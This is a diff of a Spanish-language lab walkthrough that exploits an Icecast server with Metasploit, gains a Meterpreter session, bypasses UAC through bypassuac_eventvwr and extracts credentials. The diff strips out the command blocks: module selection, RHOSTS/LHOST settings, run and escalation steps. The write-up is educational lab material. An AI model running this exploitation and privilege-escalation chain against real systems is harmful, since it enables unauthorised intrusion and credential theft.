@@ -23,13 +23,9 @@ En esta etapa, buscarás un módulo relacionado con Icecast que se pueda explota
 ![](Imagenes/6.png)
 
 Paso 2: Inicia Metasploit Framework (msf6):
- ```bash
-msconsole
-```
+
 Paso 3: Busca módulos relacionados con Icecast:
- ```bash
-search icecast
-```
+
 Esto te muestra un módulo de explotación llamado exploit/windows/http/icecast_header.
 
 ![](Imagenes/7.0.png)
@@ -40,37 +36,23 @@ Ahora, configuraremos el módulo de explotación para apuntar al sistema objetiv
 
 Paso 4: Selecciona el módulo de explotación:
 
-```bash
-use 0
-```
+
  
 (El número 0 corresponde al módulo de Icecast que aparece en la lista).
 
 Paso 5: Verifica las opciones del módulo:
 
- ```bash
-show options
-```
+
  
 ![](Imagenes/7.1.png)
 
 Aquí configurarás los siguientes parámetros:
 
-RHOSTS: La dirección IP del objetivo (10.10.237.61).
-RPORT: El puerto del servicio Icecast (8000).
-LHOST: Tu dirección IP (10.21.128.154).
-Foto aquí
 
 ![](Imagenes/7.2.png)
 
 4. Ejecución del Exploit
 En esta etapa, lanzamos el exploit para obtener acceso al sistema.
-
-Paso 6: Ejecuta el exploit:
-
- ```bash
-run
-```
 
 
 Esto inicia una sesión Meterpreter en el sistema objetivo.
@@ -88,9 +70,7 @@ Una vez dentro de la sesión de Meterpreter, puedes realizar varias acciones de 
 
 Paso 7: Verifica el usuario actual:
 
- ```bash
-getuid
-```
+
 
 El resultado será algo como Dark-PC\Dark, lo que indica que tienes acceso como ese usuario.
 
@@ -98,9 +78,7 @@ El resultado será algo como Dark-PC\Dark, lo que indica que tienes acceso como 
 
 Paso 8: Obtén información del sistema:
 
- ```bash
-sysinfo
-```
+
 ![](Imagenes/7.6.png)
 
 
@@ -109,29 +87,17 @@ Para obtener mayores privilegios en el sistema, utilizamos un módulo que sugier
 
 Paso 9: Usa el módulo Local Exploit Suggester:
 
- ```bash
-search suggester
-use post/multi/recon/local_exploit_suggester
-```
+
 ![](Imagenes/8.0.png)
 
 
 Este módulo te sugerirá varios exploits potenciales, como bypassuac_eventvwr.
 
-```bash
-set SESSION 1
-run
-```
+
 ![](Imagenes/8.1.png)
 
 Paso 10: Selecciona y ejecuta el exploit bypassuac_eventvwr:
 
- ```bash
-use exploit/windows/local/bypassuac_eventvwr
-set SESSION 1
-set LHOST 10.21.128.154
-run
-```
 ![](Imagenes/8.2.png) 
  
 Configuramos
@@ -145,9 +111,7 @@ Este intento trata de eludir el UAC (User Account Control) para obtener mayores 
 
 Paso 11: Verifica si la escalada de privilegios fue exitosa:
 
- ```bash
-getprivs
-```
+
 ![](Imagenes/8.4.png) 
 
 
@@ -169,6 +133,3 @@ Interpretación de los datos extraídos:
 + kerberos credentials: Contiene credenciales relacionadas con Kerberos.
 
 ![](Imagenes/9.3.png)
-
-
-
